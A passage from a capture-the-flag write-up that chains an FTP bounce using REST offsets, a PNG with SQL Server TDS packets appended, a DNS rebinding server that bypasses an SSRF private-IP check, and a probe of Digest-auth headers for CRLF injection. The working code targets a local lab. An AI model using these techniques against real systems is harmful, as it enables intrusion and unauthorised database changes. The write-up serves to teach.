+<p>There doesn't seem to be a way to bypass this check entirely, so the file is going to need to be a valid image. Intuitively, it seems like we'd need a polyglot file, which is simultaneously a valid image and a valid sequence of TDS packets. However, this proves to be very difficult. Instead, we can think a bit further down the line to when we actually do the FTP bounce. Specifically, are there are any FTP commands that might help us? For reference, to achieve our goal of sending raw file contents to a destination via FTP, our FTP commands would be:</p>
+<pre class="language-python"><code class="language-python">TYPE I                  <span class="token comment"># ensure that we're in binary mode</span>
+EPRT <span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">|</span><span class="token number">1234</span><span class="token operator">|</span> <span class="token comment"># open a data connection to 127.0.0.1:1234 using IPv4</span>
+RETR example<span class="token punctuation">.</span>png        <span class="token comment"># send the raw bytes of 'example.png' over the data connection</span></code></pre>
+<p>After looking through <a href="https://en.wikipedia.org/wiki/List_of_FTP_commands">a list of FTP commands</a>, you'll notice the definition of the <code>REST</code> command.</p>
+<blockquote>
+<p>RESTART (REST)</p>
+<p>The argument field represents the server marker at which
+file transfer is to be restarted. This command does not
+cause file transfer but skips over the file to the specified
+data checkpoint. This command shall be immediately followed
+by the appropriate FTP service command which shall cause
+file transfer to resume.</p>
+</blockquote>
+<p>Essentially, the <code>REST</code> command allows us to send the content of a file starting from an offset we specify. This means that instead of creating a polyglot file, we just need to have the TDS packets be the last bytes in a valid image. This would allow us to do the following.</p>
+<pre class="language-python"><code class="language-python">TYPE I
+EPRT <span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">|</span><span class="token number">1234</span><span class="token operator">|</span>
+REST <span class="token operator">&lt;</span>offset<span class="token operator">-</span>to<span class="token operator">-</span>TDS<span class="token operator">-</span>packet<span class="token operator">></span> <span class="token comment"># set the offset to the start of the TDS packets</span>
+RETR example<span class="token punctuation">.</span>png            <span class="token comment"># send the content starting from the offset</span></code></pre>
+<p>With this approach, the image format we choose just needs to allow arbitrary trailing data. Luckily, this is allowed by a lot of image formats, since parsers will typically stop reading information based on defined <code>length</code> fields or terminators. For example, the <a href="https://en.wikipedia.org/wiki/PNG">PNG</a> file format works on chunks of data that each have specific purposes. The final chunk of a PNG file is a specific type of chunk (<code>IEND</code>) that indicates the end of the image. This means that adding data beyond the <code>IEND</code> chunk has no effect on the <code>identify</code> command.</p>
+<pre class="language-sh"><code class="language-sh">$ identify <span class="token parameter variable">-format</span> <span class="token string">"%w %h %m"</span> -- example.png <span class="token comment"># identify a normal png</span>
+<span class="token number">870</span> <span class="token number">1025</span> PNG
+$ pwn cyclic <span class="token number">2000</span> <span class="token operator">>></span> example.png             <span class="token comment"># append 2000 garbage characters</span>
+$ identify <span class="token parameter variable">-format</span> <span class="token string">"%w %h %m"</span> -- example.png <span class="token comment"># identify again</span>
+<span class="token number">870</span> <span class="token number">1025</span> PNG                                 <span class="token comment"># same results</span></code></pre>
+<p>We now have a way to create a valid image containing arbitrary trailing data, which we can selectively send using the <code>REST</code> FTP command. The last thing we need to figure out is what data to actually send. To avoid manually constructing TDS packets, we can just spin up the challenge locally, connect to the database, run the SQL query we want, and get the packet bytes from wireshark.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> pymssql
+
+<span class="token keyword">def</span> <span class="token function">_conn</span><span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token string">'birdarchive'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># use the same details as the challenge</span>
+    <span class="token keyword">return</span> pymssql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
+        server<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"localhost:1433"</span></span><span class="token punctuation">,</span>
+        user<span class="token operator">=</span><span class="token string">'babelfish_user'</span><span class="token punctuation">,</span>
+        password<span class="token operator">=</span><span class="token string">'12345678'</span><span class="token punctuation">,</span> <span class="token comment"># always static, lucky!</span>
+        database<span class="token operator">=</span>database<span class="token punctuation">,</span>
+        as_dict<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sql_cmd <span class="token operator">=</span> query
+    <span class="token keyword">with</span> _conn<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
+        <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>
+            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql_cmd<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+run<span class="token punctuation">(</span><span class="token string">"UPDATE flags SET is_hidden = 0; COMMIT"</span><span class="token punctuation">)</span></code></pre>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2026-09-03 142451.png">
+<p>There's a lot that could go wrong with this approach:</p>
+<ul>
+<li>What if a packet needs to contain unique information that was returned in response to a previous packet?</li>
+<li>What if the packets need to contain valid information that is unique to the host or the DB instance (e.g. a hostname or IP address)?</li>
+</ul>
+<p>Regardless of these potential pitfalls, its worth trying. If it doesn't work, we can just dig deeper to figure out why. Anyway, the following python script takes the raw packets we recorded and sends them to the local database again.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> socket
+<span class="token keyword">import</span> time
+
+prelogin <span class="token operator">=</span> <span class="token string">"12[...snip...]00"</span>
+login <span class="token operator">=</span> <span class="token string">"10[...snip...]ff"</span>
+sqlbatch_1 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_2 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_3 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_4 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+
+packets <span class="token operator">=</span> <span class="token punctuation">[</span>
+    prelogin<span class="token punctuation">,</span>
+    login<span class="token punctuation">,</span>
+    sqlbatch_1<span class="token punctuation">,</span> <span class="token comment"># the attention packet was excluded, it caused issues and wasn't required.</span>
+    sqlbatch_2<span class="token punctuation">,</span>
+    sqlbatch_3<span class="token punctuation">,</span>
+    sqlbatch_4
+<span class="token punctuation">]</span>
+data <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>packets<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1433</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span>dest<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment"># need to keep the connection alive while babelfish does stuff</span>
+s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>Before running this, we need to set the flag to be hidden again, since we unhid it when we generated the traffic earlier.</p>
+<pre class="language-python"><code class="language-python">run<span class="token punctuation">(</span><span class="token string">"UPDATE flags SET is_hidden = 1; COMMIT"</span><span class="token punctuation">)</span> <span class="token comment"># hide it</span></code></pre>
+<p>Now that it's hidden again, we can run our script, and sure enough we see that the flag is unhidden again.</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2026-09-03 153245.png">
+<p>This means we have everything we need to generate valid images containing TDS packets.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">import</span> png
+
+prelogin <span class="token operator">=</span> <span class="token string">"12[...snip...]00"</span>
+login <span class="token operator">=</span> <span class="token string">"10[...snip...]ff"</span>
+sqlbatch_1 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_2 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_3 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+sqlbatch_4 <span class="token operator">=</span> <span class="token string">"01[...snip...]00"</span>
+
+packets <span class="token operator">=</span> <span class="token punctuation">[</span>
+    prelogin<span class="token punctuation">,</span>
+    login<span class="token punctuation">,</span>
+    sqlbatch_1<span class="token punctuation">,</span>
+    sqlbatch_2<span class="token punctuation">,</span>
+    sqlbatch_3<span class="token punctuation">,</span>
+    sqlbatch_4
+<span class="token punctuation">]</span>
+
+data <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>packets<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+image <span class="token operator">=</span> png<span class="token punctuation">.</span>from_array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./exploit_image.png"</span><span class="token punctuation">)</span> <span class="token comment"># create a PNG with a single pixel</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./exploit_image.png"</span><span class="token punctuation">,</span> <span class="token string">"ab"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token comment"># append our TDS packets to the file</span></code></pre>
+<pre class="language-sh"><code class="language-sh">$ identify <span class="token parameter variable">-format</span> <span class="token string">"%w %h %m"</span> -- exploit_image.png
+<span class="token number">3</span> <span class="token number">1</span> PNG <span class="token comment"># identify is happy with the exploit image, so the scraper will download it.</span></code></pre>
+<h2>DNS Rebinding to Interact with FTP</h2>
+<p>Now that we have our crafted images, and they can be scraped, we need to reach the point where we can run FTP commands. As we discussed earlier, this will involve DNS rebinding so that a scrape HTTP request is instead sent to the internal FTP server. To get this working locally, we'll update the <code>docker-compose.yml</code> file to make the <code>web</code> container use the host as a nameserver. This will allow us to emulate the behaviour of properly registring a domain name and configuring a nameserver.</p>
+<h4><code>docker-compose.yml</code></h4>
+<pre class="language-yaml"><code class="language-yaml"><span class="token key atrule">services</span><span class="token punctuation">:</span>
+  <span class="token key atrule">nginx</span><span class="token punctuation">:</span>
+    <span class="token punctuation">[</span><span class="token punctuation">...</span>snip<span class="token punctuation">...</span><span class="token punctuation">]</span>
+
+  <span class="token key atrule">web</span><span class="token punctuation">:</span>
+    <span class="token key atrule">build</span><span class="token punctuation">:</span> ./web
+    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token string">"80:80"</span>
+      <span class="token punctuation">-</span> <span class="token string">"1433:1433"</span>
+      <span class="token punctuation">-</span> <span class="token string">"21:21"</span>
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+    <span class="token punctuation">[</span><span class="token punctuation">...</span>snip<span class="token punctuation">...</span><span class="token punctuation">]</span>
+    <span class="token key atrule">restart</span><span class="token punctuation">:</span> unless<span class="token punctuation">-</span>stopped
+    <span class="token key atrule">dns</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> 172.17.0.1 <span class="token comment"># make the web container use the host as the DNS server</span>
+
+  <span class="token key atrule">babelfish</span><span class="token punctuation">:</span>
+    <span class="token punctuation">[</span><span class="token punctuation">...</span>snip<span class="token punctuation">...</span><span class="token punctuation">]</span></code></pre>
+<p>Then we can write a small DNS server that handles the DNS rebinding.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> dnslib<span class="token punctuation">.</span>server <span class="token keyword">import</span> BaseResolver<span class="token punctuation">,</span> DNSServer
+<span class="token keyword">from</span> dnslib<span class="token punctuation">.</span>dns <span class="token keyword">import</span> RR
+<span class="token keyword">import</span> time
+
+<span class="token keyword">class</span> <span class="token class-name">Rebinder</span><span class="token punctuation">(</span>BaseResolver<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>response_counter <span class="token operator">=</span> <span class="token number">0</span>
+
+    <span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        reply <span class="token operator">=</span> request<span class="token punctuation">.</span>reply<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        qname <span class="token operator">=</span> request<span class="token punctuation">.</span>questions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>qname
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>questions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>qtype <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> reply <span class="token comment"># we only want to respond to A questions</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>response_counter <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            reply<span class="token punctuation">.</span>add_answer<span class="token punctuation">(</span><span class="token operator">*</span>RR<span class="token punctuation">.</span>fromZone<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>qname<span class="token punctuation">}</span></span><span class="token string"> 0 A 127.0.0.1"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># ttl is 0</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            reply<span class="token punctuation">.</span>add_answer<span class="token punctuation">(</span><span class="token operator">*</span>RR<span class="token punctuation">.</span>fromZone<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>qname<span class="token punctuation">}</span></span><span class="token string"> 0 A 142.250.195.174"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># ttl is 0</span>
+
+        self<span class="token punctuation">.</span>response_counter <span class="token operator">+=</span> <span class="token number">1</span>
+        <span class="token keyword">return</span> reply
+
+server <span class="token operator">=</span> DNSServer<span class="token punctuation">(</span>Rebinder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token string">"172.17.0.1"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">53</span><span class="token punctuation">)</span>
+server<span class="token punctuation">.</span>start_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre>
+<p>The responses from this DNS server will flip back and forth between <code>142.250.195.174</code> (a google IP) and <code>127.0.0.1</code>.</p>
+<pre class="language-sh"><code class="language-sh">$ <span class="token function">nslookup</span>
+<span class="token operator">></span> example.com
+
+Name:	example.com
+Address: <span class="token number">142.250</span>.195.174
+<span class="token operator">></span> example.com
+
+Name:	example.com
+Address: <span class="token number">127.0</span>.0.1
+<span class="token operator">></span> example.com
+
+Name:	example.com
+Address: <span class="token number">142.250</span>.195.174
+<span class="token operator">></span> example.com
+
+Name:	example.com
+Address: <span class="token number">127.0</span>.0.1</code></pre>
+<p>Now when we scrape a URL, the application should:</p>
+<ol>
+<li>Resolve the domain and receive <code>142.250.195.174</code>.</li>
+<li>Validate that <code>142.250.195.174</code> is not a private IP address.</li>
+<li>Make a HTTP request to the URL, which resolves the domain again. This time it resolves to <code>127.0.0.1</code>, and the request is sent there.</li>
+</ol>
+<p>This means we can scrape a URL like <code>http://rebinding:21/ABC</code> to send the HTTP request to the FTP server. This results in the following FTP logs, indicating that our DNS rebinding was successful!</p>
+<pre class="language-python"><code class="language-python"><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> FTP session opened <span class="token punctuation">(</span>connect<span class="token punctuation">)</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">220</span> pyftpdlib <span class="token number">2.2</span><span class="token number">.0</span> ready<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> GET <span class="token operator">/</span>ABC HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"GET"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> Host<span class="token punctuation">:</span> rebinding<span class="token punctuation">:</span><span class="token number">21</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"HOST:"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> python<span class="token operator">-</span>requests<span class="token operator">/</span><span class="token number">2.34</span><span class="token number">.2</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"USER-AGENT:"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"ACCEPT-ENCODING:"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"ACCEPT:"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span> Connection<span class="token punctuation">:</span> keep<span class="token operator">-</span>alive
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">"CONNECTION:"</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token operator">-</span>
+<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">45330</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">500</span> Command <span class="token string">""</span> <span class="token keyword">not</span> understood<span class="token punctuation">.</span></code></pre>
+<p>We run into another issue now though. We only control the path and the hostname of the HTTP request, both of which have their own limitations. The path we provide will be URL encoded and otherwise limited by the python requests library, and in a real deployment, the hostname can't be malformed in anyway and must be valid. This prevents us from using either of these fields for CRLF injection, which we'd need in order to start sending valid FTP commands.</p>
+<h2>CRLF Injection to Send Valid FTP Commands</h2>
+<p>To get an idea of how we might get CRLF injection, we can look back at the scraper source code to see if we can extend our control over the HTTP request. Notably, there is special handling for <code>401</code> status codes returned by the server being scraped. If you recall, the scraper supports optional credentials being supplied, this is the part of the code that uses them to authenticate.</p>
+<h4><code>web/bbbird_archive/app/scraper.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>
+            r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            auth_header <span class="token operator">=</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"basic"</span> <span class="token keyword">in</span> auth_header<span class="token punctuation">:</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth<span class="token operator">=</span>HTTPBasicAuth<span class="token punctuation">(</span>auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+            <span class="token keyword">elif</span> <span class="token string">"digest"</span> <span class="token keyword">in</span> auth_header<span class="token punctuation">:</span>
+                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth<span class="token operator">=</span>HTTPDigestAuth<span class="token punctuation">(</span>auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Unsupported auth method </span><span class="token interpolation"><span class="token punctuation">{</span>auth_header<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        r<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> r</code></pre>
+<p>The code simply checks for a <code>WWW-Authenticate</code> header in the initial response, and then sends the request again with either <code>Basic</code> or <code>Digest</code> authentication depending on its value. At a glance, the <code>Basic</code> authentication is not very interesting here, since our extra username and password inputs would only be included in the request after being base64 encoded. However, the <code>Digest</code> authentication process is a little more complicated, and might give us some interesting control. The RFC that <a href="https://datatracker.ietf.org/doc/html/rfc2617#section-3.2.1">defines Digest authentication</a> outlines the below flow:</p>
+<ol>
+<li>If a client attempts to access a retricted resource, the server must respond with a <code>WWW-Authenticate</code> header containing a <code>digest-challenge</code>. This challenge includes fields like <code>realm</code>, <code>domain</code>, <code>nonce</code>, etc.</li>
+<li>The client is then expected to retry the request, including an <code>Authorization</code> header containing a <code>digest-response</code>. The <code>digest-response</code> contains the <code>username</code> and other relevant fields (like <code>realm</code> and <code>nonce</code>) as quoted strings.</li>
+<li>The server authenticates the user using the <code>digest-response</code> and allows them to access the restricted resource.</li>
+</ol>
+<p>Based on this, it sounds like we could get some control over the <code>Authorization</code> header that the scraper sends. To test this, we'll write a small web server that returns a <code>WWW-Authenticate</code> header and logs incoming requests.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> HTTPServer<span class="token punctuation">,</span> BaseHTTPRequestHandler
+
+<span class="token keyword">class</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">,</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"WWW-Authenticate"</span><span class="token punctuation">,</span> <span class="token string">'Digest realm="test", nonce="testing"'</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'198.0.2.1'</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span>
+http <span class="token operator">=</span> HTTPServer<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
+http<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>To simulate this web server being accessible on the Internet, we can create a dedicated dummy interface for the web server, making it available at <code>198.0.2.1</code>.</p>
+<pre class="language-sh"><code class="language-sh">nmcli connection <span class="token function">add</span> <span class="token builtin class-name">type</span> dummy ifname web ipv4.method manual ipv4.addresses <span class="token number">198.0</span>.2.1/32</code></pre>
+<p>After temporarily removing the custom DNS server, we can scrape <code>http://198.0.2.1:8000</code> and observe how the scraper behaves.</p>
+<pre class="language-sh"><code class="language-sh"><span class="token number">172.18</span>.0.2 - - <span class="token punctuation">[</span>04/Sep/2026 <span class="token number">16</span>:55:57<span class="token punctuation">]</span> <span class="token string">"GET / HTTP/1.1"</span> <span class="token number">401</span> -
+Host: <span class="token number">198.0</span>.2.1:8000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+<span class="token number">172.18</span>.0.2 - - <span class="token punctuation">[</span>04/Sep/2026 <span class="token number">16</span>:55:57<span class="token punctuation">]</span> <span class="token string">"GET / HTTP/1.1"</span> <span class="token number">401</span> -
+Host: <span class="token number">198.0</span>.2.1:8000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Authorization: Digest <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"test_username"</span>, <span class="token assign-left variable">realm</span><span class="token operator">=</span><span class="token string">"test"</span>, <span class="token assign-left variable">nonce</span><span class="token operator">=</span><span class="token string">"testing"</span>, <span class="token assign-left variable">uri</span><span class="token operator">=</span><span class="token string">"/"</span>, <span class="token assign-left variable">response</span><span class="token operator">=</span><span class="token string">"2addb6d1585878fad60de422240f8b96"</span>
+</code></pre>
